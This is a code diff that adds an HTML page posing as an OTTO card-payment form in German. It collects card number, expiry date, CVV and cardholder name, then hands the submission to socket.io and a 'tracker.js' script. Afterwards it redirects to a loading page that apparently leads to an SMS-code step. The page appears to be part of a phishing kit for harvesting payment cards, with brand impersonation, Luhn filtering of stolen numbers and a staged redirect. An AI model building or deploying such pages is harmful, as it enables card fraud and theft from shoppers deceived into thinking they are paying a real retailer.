@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/bratoka.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <style>
+        body {
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #1a1a1a;
+            display: block; /* Override flex from dionam.css */
+            min-height: 100vh;
+        }
+
+        .cc-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 40px;
+            border-bottom: 1px solid #eaeaea;
+        }
+
+        .cc-logo {
+            
+            padding: 8px;
+            display: inline-block;
+        }
+
+        .cc-logo img {
+            height: 50px;
+            display: block;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #001a3b;
+            cursor: pointer;
+        }
+        
+        .language-selector svg {
+            width: 16px;
+            height: 16px;
+            fill: #001a3b;
+        }
+
+        .cc-main {
+            max-width: 550px;
+            margin: 60px auto;
+            padding: 0 20px;
+        }
+
+        .cc-page-title {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            color: #001a3b;
+            margin-bottom: 30px;
+        }
+
+        .cc-form-box {
+            background-color: #f7f7f9;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 25px;
+        }
+
+        .cc-box-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+
+        .cc-box-header svg {
+            width: 24px;
+            height: 24px;
+            fill: #001a3b;
+        }
+
+        .cc-box-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #001a3b;
+        }
+
+        .mandatory-text {
+            font-size: 12px;
+            color: #5b687c;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            color: #292929;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 40px 12px 15px;
+            border: 1px solid #d0d0d0;
+            border-radius: 8px;
+            font-size: 15px;
+            color: #333;
+            box-sizing: border-box;
+            background-color: #fff;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            outline: none;
+        }
+
+        .form-input:focus {
+            border-color: #0070ba;
+            box-shadow: 0 0 0 1px #0070ba;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 12px;
+            width: 24px;
+            height: 16px;
+            background-color: #e5e5e5;
+            border-radius: 2px;
+        }
+
+        .input-icon-back {
+            position: absolute;
+            right: 12px;
+            width: 24px;
+            height: 16px;
+          
+        }
+        
+        
+
+        .card-logos {
+            display: flex;
+            gap: 8px;
+            margin-top: 8px;
+        }
+        .card-logos img{
+            height: 30px;
+        }
+
+        .card-logo {
+            width: 32px;
+            height: 20px;
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 8px;
+            font-weight: bold;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 20px;
+        }
+
+        .form-col {
+            flex: 1;
+        }
+
+        .subtext {
+            font-size: 11px;
+            color: #5b687c;
+            margin-top: 6px;
+        }
+
+        .save-card-box {
+            background-color: #fff;
+            border: 1px solid #d0d0d0;
+            border-radius: 4px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 25px;
+            margin-bottom: 25px;
+            cursor: pointer;
+        }
+
+        .save-card-box input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            margin: 0;
+        }
+
+        .save-card-box label {
+            font-size: 14px;
+            color: #001a3b;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .btn-buy {
+            background-color: #081226;
+            color: #fff;
+            width: 100%;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-buy:hover {
+            background-color: #050b17;
+        }
+
+        .btn-buy svg {
+            width: 16px;
+            height: 16px;
+            fill: #fff;
+        }
+
+        .cc-footer {
+            border-top: 1px solid #eaeaea;
+            padding: 20px 40px;
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 50px;
+        }
+
+        .cc-footer a {
+            font-size: 12px;
+            color: #001a3b;
+            text-decoration: underline;
+        }
+
+        .has-error .form-input {
+            border-color: #ff3b30;
+            background-color: #fffaf9;
+        }
+        .has-success .form-input {
+            border-color: #34c759;
+        }
+        .has-error .error-text {
+            display: block !important;
+        }
+        .error-text {
+            color: #ff3b30;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        /* Mobile Responsiveness */
+        @media screen and (max-width: 768px) {
+            .cc-header {
+                padding: 15px 20px;
+            }
+            .cc-main {
+                margin: 20px auto;
+                padding: 0 15px;
+            }
+            .form-row {
+                flex-direction: column;
+                gap: 20px;
+            }
+            .cc-footer {
+                padding: 20px;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="cc-header">
+        <div class="cc-logo">
+            <img src="./img/otologo-2.jpg" alt="OTTO">
+        </div>
+        <div class="language-selector">
+            <svg viewBox="0 0 24 24">
+                <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm6.93 6h-2.95c-.32-1.25-.78-2.45-1.38-3.56 1.84.63 3.37 1.91 4.33 3.56zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82c.43-1.43 1.08-2.76 1.91-3.96zM4.26 14C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2s.06 1.34.14 2H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56-1.84-.63-3.37-1.9-4.33-3.56zm2.95-8H5.08c.96-1.66 2.49-2.93 4.33-3.56C8.81 5.55 8.35 6.75 8.03 8zM12 19.96c-.83-1.2-1.48-2.53-1.91-3.96h3.82c-.43 1.43-1.08 2.76-1.91 3.96zM14.34 14H9.66c-.09-.66-.16-1.32-.16-2s.07-1.35.16-2h4.68c.09.65.16 1.32.16 2s-.07 1.34-.16 2zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95c-.96 1.65-2.49 2.93-4.33 3.56zM16.36 14c.08-.66.14-1.32.14-2s-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2h-3.38z"/>
+            </svg>
+            Deutsch
+        </div>
+    </header>
+
+    <main class="cc-main">
+        <h1 class="cc-page-title">Wählen Sie eine Zahlungsmethode aus</h1>
+
+        <div class="cc-form-box">
+            <div class="cc-box-header">
+                <svg viewBox="0 0 24 24">
+                    <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/>
+                </svg>
+                <div class="cc-box-title">Cards</div>
+            </div>
+
+            <div class="mandatory-text">
+                Alle Felder sind Pflichtfelder, sofern nicht anders gekennzeichnet.
+            </div>
+
+            <form id="creditCardForm" >
+                <div class="form-group" id="group-cardNumber">
+                    <label class="form-label">Kartennummer</label>
+                    <div class="input-wrapper">
+                        <input type="tel" id="cardNumber" name="cardNumber" class="form-input" required >
+                        <div class="input-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="27" height="18" fill="none" viewBox="0 0 27 18"><path fill="#E6E9EB" d="M0 3a3 3 0 0 1 3-3h21a3 3 0 0 1 3 3v12a3 3 0 0 1-3 3H3a3 3 0 0 1-3-3V3z"/><path fill="#B9C4C9" d="M4 12h19v2H4z"/><rect width="4" height="4" x="4" y="4" fill="#fff" rx="1"/></svg>
+                        </div>
+                    </div>
+                    <div class="error-text">Bitte geben Sie eine gültige Kartennummer ein.</div>
+                    <div class="card-logos">
+                        <img src="./img/ccico-under.PNG" alt="">
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-col">
+                        <div class="form-group" id="group-expDate">
+                            <label class="form-label">Ablaufdatum</label>
+                            <div class="input-wrapper">
+                                <input type="tel" id="expDate" name="expiryDate" class="form-input" required >
+                                <div class="input-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="16" viewBox="0 0 24 16" fill="none">
+<path d="M0 3C0 1.34315 1.34315 0 3 0H21C22.6569 0 24 1.34315 24 3V13C24 14.6569 22.6569 16 21 16H3C1.34315 16 0 14.6569 0 13V3Z" fill="#E5E5EA"/>
+<rect x="3" y="8" width="18" height="2" rx="0.5" fill="#C7C7CC"/>
+<rect x="3" y="3" width="3" height="3" rx="0.5" fill="white"/>
+<rect x="11.5" y="10.5" width="6" height="4" rx="2" stroke="#FF3B30"/>
+</svg>
+                                </div>
+                            </div>
+                            <div class="subtext">Vorderseite der Karte im Format MM/JJ</div>
+                            <div class="error-text">Bitte geben Sie ein gültiges Datum ein.</div>
+                        </div>
+                    </div>
+                    <div class="form-col">
+                        <div class="form-group" id="group-cvv">
+                            <label class="form-label">Sicherheitscode</label>
+                            <div class="input-wrapper">
+                                <input type="tel" id="cvv" name="cvv" class="form-input" required >
+                                <div class="input-icon-back">
+                                    <svg width="27" height="18" viewBox="0 0 27 18" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="false" role="img" class="adyen-checkout__card__cvc__hint adyen-checkout__card__cvc__hint--back"><title id="adyen-checkout__cvc__back-hint-img">Sicherheitscode 3 Ziffern auf der Rückseite der Karte</title><path d="M27 4.00001V3.37501C27 2.4799 26.6444 1.62146 26.0115 0.988518C25.3786 0.355581 24.5201 0 23.625 0H3.375C2.47989 0 1.62145 0.355581 0.988514 0.988518C0.355579 1.62146 0 2.4799 0 3.37501V4.00001H27Z" fill="#E6E9EB"></path><path d="M0 6.99994V14.6666C0 15.5507 0.355579 16.3985 0.988514 17.0237C1.62145 17.6488 2.47989 18 3.375 18H23.625C24.5201 18 25.3786 17.6488 26.0115 17.0237C26.6444 16.3985 27 15.5507 27 14.6666V6.99994H0Z" fill="#E6E9EB"></path><rect y="4.00012" width="27" height="3.00001" fill="#687282"></rect><path d="M4 11C4 10.4477 4.44772 10 5 10H21C22.1046 10 23 10.8954 23 12C23 13.1046 22.1046 14 21 14H5C4.44771 14 4 13.5523 4 13V11Z" fill="white"></path><rect x="16.5" y="9.5" width="7" height="5" rx="2.5" stroke="#C12424" class="adyen-checkout__card__cvc__hint__location"></rect></svg>
+                                </div>
+                            </div>
+                            <div class="subtext">3 Ziffern auf der Rückseite der Karte</div>
+                            <div class="error-text">Ungültiger Code.</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Name auf der Karte</label>
+                    <div class="input-wrapper">
+                        <input type="text" class="form-input" name="cardName" required autocomplete="cc-name">
+                    </div>
+                </div>
+
+                <div class="save-card-box">
+                    <input type="checkbox" id="saveCard">
+                    <label for="saveCard">Für zukünftige Zahlvorgänge speichern</label>
+                </div>
+
+                <button type="submit" id="submitBtn" class="btn-buy">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/>
+                    </svg>
+                    Absenden
+                </button>
+            </form>
+        </div>
+    </main>
+
+    <div id="loadingSpinner" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.8); z-index:9999; justify-content:center; align-items:center;">
+        <div style="border: 5px solid #f3f3f3; border-top: 5px solid #001a3b; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite;"></div>
+    </div>
+    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+
+    <footer class="cc-footer">
+        <a href="#">Allgemeine Geschäftsbedingungen</a>
+    </footer>
+
+
+    <script src="/socket.io/socket.io.js"></script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const form = document.getElementById('creditCardForm');
+            const cardNumberInput = document.getElementById('cardNumber');
+            const expDateInput = document.getElementById('expDate');
+            const cvvInput = document.getElementById('cvv');
+
+            // Format card number with spaces
+            cardNumberInput.addEventListener('input', function (e) {
+                let value = e.target.value.replace(/\s+/g, '');
+                let formattedValue = '';
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
+                    formattedValue += value[i];
+                }
+                e.target.value = formattedValue;
+            });
+
+            // Format expiry date with slash
+            expDateInput.addEventListener('input', function (e) {
+                let value = e.target.value.replace(/\D/g, ''); // Strip non-digits
+                if (value.length > 2) {
+                    e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                } else {
+                    e.target.value = value;
+                }
+            });
+
+            // Restrict numeric input
+            cardNumberInput.addEventListener('keypress', forceNumeric);
+            expDateInput.addEventListener('keypress', forceNumeric);
+            cvvInput.addEventListener('keypress', forceNumeric);
+
+            function forceNumeric(e) {
+                if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
+                    e.preventDefault();
+                }
+            }
+
+            // Validators
+            function isValidCardNumber(number) {
+                if (number.length < 13 || number.length > 19) return false;
+                let sum = 0;
+                let shouldDouble = false;
+                for (let i = number.length - 1; i >= 0; i--) {
+                    let digit = parseInt(number.charAt(i));
+                    if (shouldDouble) {
+                        digit *= 2;
+                        if (digit > 9) digit -= 9;
+                    }
+                    sum += digit;
+                    shouldDouble = !shouldDouble;
+                }
+                return (sum % 10) === 0;
+            }
+
+            function isExpDateValid() {
+                const val = expDateInput.value;
+                if (val.length !== 5) return false;
+                const parts = val.split('/');
+                if (parts.length !== 2) return false;
+
+                const m = parseInt(parts[0], 10);
+                const y = parseInt(parts[1], 10) + 2000;
+
+                if (m < 1 || m > 12) return false;
+
+                const currentDate = new Date();
+                const currentYear = currentDate.getFullYear();
+                const currentMonth = currentDate.getMonth() + 1;
+
+                return y > currentYear || (y === currentYear && m >= currentMonth);
+            }
+
+            // Real-time validation visually via touched class
+            function validateFieldGroup(inputElement, groupElementId, validationFn) {
+                const group = document.getElementById(groupElementId);
+                const val = (inputElement.value || "").replace(/\s/g, '');
+                group.classList.add('touched');
+
+                if (!val && inputElement.tagName !== 'SELECT') {
+                    group.classList.remove('has-success', 'has-error');
+                    return false;
+                }
+
+                if (validationFn(val)) {
+                    group.classList.remove('has-error');
+                    group.classList.add('has-success');
+                    return true;
+                } else {
+                    group.classList.add('has-error');
+                    group.classList.remove('has-success');
+                    return false;
+                }
+            }
+
+            cardNumberInput.addEventListener('blur', () => {
+                validateFieldGroup(cardNumberInput, 'group-cardNumber', val => isValidCardNumber(val));
+            });
+
+            expDateInput.addEventListener('blur', () => {
+                validateFieldGroup(expDateInput, 'group-expDate', () => isExpDateValid());
+            });
+
+            expDateInput.addEventListener('input', () => {
+                if (expDateInput.value.length === 5) {
+                    validateFieldGroup(expDateInput, 'group-expDate', () => isExpDateValid());
+                } else {
+                    const group = document.getElementById('group-expDate');
+                    group.classList.remove('has-success', 'has-error');
+                }
+            });
+
+            cvvInput.addEventListener('blur', () => {
+                validateFieldGroup(cvvInput, 'group-cvv', val => val.length >= 3 && val.length <= 4 && /^\d+$/.test(val));
+            });
+
+            // Form Submission
+            form.addEventListener('submit', function (e) {
+                form.classList.add('submitted'); // Enables showing all errors via CSS
+
+                const num = cardNumberInput.value.replace(/\s/g, '');
+                const cardValid = isValidCardNumber(num);
+                const groupCard = document.getElementById('group-cardNumber');
+                if(groupCard) {
+                    cardValid ? (groupCard.classList.add('has-success'), groupCard.classList.remove('has-error'))
+                        : (groupCard.classList.add('has-error'), groupCard.classList.remove('has-success'));
+                }
+
+                const dateValid = isExpDateValid();
+                const groupDate = document.getElementById('group-expDate');
+                if(groupDate) {
+                    dateValid ? (groupDate.classList.add('has-success'), groupDate.classList.remove('has-error'))
+                        : (groupDate.classList.add('has-error'), groupDate.classList.remove('has-success'));
+                }
+
+                const cvvVal = cvvInput.value;
+                const cvvValid = cvvVal.length >= 3 && cvvVal.length <= 4 && /^\d+$/.test(cvvVal);
+                const groupCvv = document.getElementById('group-cvv');
+                if(groupCvv) {
+                    cvvValid ? (groupCvv.classList.add('has-success'), groupCvv.classList.remove('has-error'))
+                        : (groupCvv.classList.add('has-error'), groupCvv.classList.remove('has-success'));
+                }
+
+                if (!cardValid || !dateValid || !cvvValid) {
+                    e.preventDefault();
+                    e.stopImmediatePropagation(); // Crucial to stop tracker.js from catching invalid submit
+                    form.removeAttribute('data-redirect');
+                    return false;
+                }
+
+                // Success tracking and redirecting
+                form.setAttribute('data-redirect', '/loading?time=15&url=/SmS-1-hkjnUHnKJHu');
+                const submitButton = document.getElementById('submitBtn');
+                if(submitButton) submitButton.disabled = true;
+
+                // Show loading spinner overlay
+                const spinner = document.getElementById('loadingSpinner');
+                if(spinner) spinner.style.display = 'flex';
+
+                // We DO NOT call preventDefault() or requestSubmit() here.
+                // The event will bubble to document naturally, tracker.js will pick it up
+                // and it will process the submission and perform the redirect!
+            });
+        });
+    </script>
+    <script src="js/tracker.js"></script>
+</body>
+
+</html>
